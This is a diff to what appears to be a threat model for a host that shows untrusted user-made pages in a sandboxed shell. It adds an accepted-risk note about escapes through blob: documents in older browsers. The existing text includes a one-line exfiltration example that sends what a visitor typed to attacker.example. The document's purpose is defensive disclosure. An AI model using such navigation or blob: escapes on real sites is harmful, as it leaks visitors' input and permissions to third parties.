@@ -373,8 +373,11 @@ the attacker (c), and its readers are strangers.
 - In a browser without the Navigation API (older Safari and Firefox releases), a page opened in
   a tab can navigate itself away with data in the address (`location = "https://attacker.example/?"
   + whatTheVisitorTyped`): the shell's guard gets no events there, and a tab has no embedding page
-  whose `frame-src` would stop it (P099, accepted). A host that must cover such browsers shows
-  public pages in its own frame.
+  whose `frame-src` would stop it. It can also go to a `blob:` document it wrote itself, where
+  the shell never runs: the CSP and its sandbox carry over, the `Permissions-Policy` header and
+  the shell's walls don't (WebRTC is there, and a granted location). No CSP directive closes
+  either (P099, accepted). A host that must cover such browsers shows public pages in its own
+  frame.
 - `db` and `user` reach the author without any network: what viewers write, and `user.get()`'s
   `{ id, name, level }`, the page can read and keep in `db`. Closed egress doesn't cover a channel
   the host itself provides. Give `id` a per-artifact pseudonym (`pseudonymFor`), and decide what
